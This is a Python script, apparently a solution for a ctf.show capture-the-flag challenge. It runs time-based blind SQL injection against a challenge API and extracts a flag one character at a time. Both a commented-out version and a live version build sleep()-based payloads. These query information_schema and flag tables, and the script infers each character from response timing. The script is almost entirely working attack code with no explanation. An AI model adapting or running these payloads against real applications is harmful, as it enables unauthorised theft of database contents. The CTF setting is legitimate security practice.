# import time
# import requests
# url = 'http://7d69f7fc-0f02-41a8-b4f4-c8a0a66fde14.challenge.ctf.show/api/index.php'
# flag = ''
# for i in range(60):
#     lenth = len(flag)
#     min,max = 32,128
#     while True:
#         j = min + (max-min)//2
#         if(min == j):
#             flag += chr(j)
#             print(flag)
#             break
#
#         payload = {"ip":f"if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),{i},1))<{j},sleep(0.5),1)"   # 注表名
#                    ,'debug':0}
#         # 注列名
#         #f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'),{i},1))<{j},sleep(0.5),'False')"
#
#         # 爆字段
#         #f"if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),{i},1))<{j},sleep(0.5),1)"
#         start_time = time.time()
#         r = requests.post(url=url,data=payload).text
#         end_time = time.time()
#         sub = end_time - start_time
#         if(sub >= 0.5):
#             max = j
#         else:
#             min = j

import requests
url = 'http://7bd14c04-b4e7-49a6-acaa-93d3b3cda697.challenge.ctf.show/api/index.php'
flag = ''
for i in range(60):
    lenth = len(flag)
    min,max = 32,128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            break

        payload = {"ip":f"'') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxcc),{i},1))<{j},sleep(0.3),1)#"
                   ,'debug':0}

        try:
            r = requests.post(url=url,data=payload,timeout=0.29)
            min = j
        except:
            max = j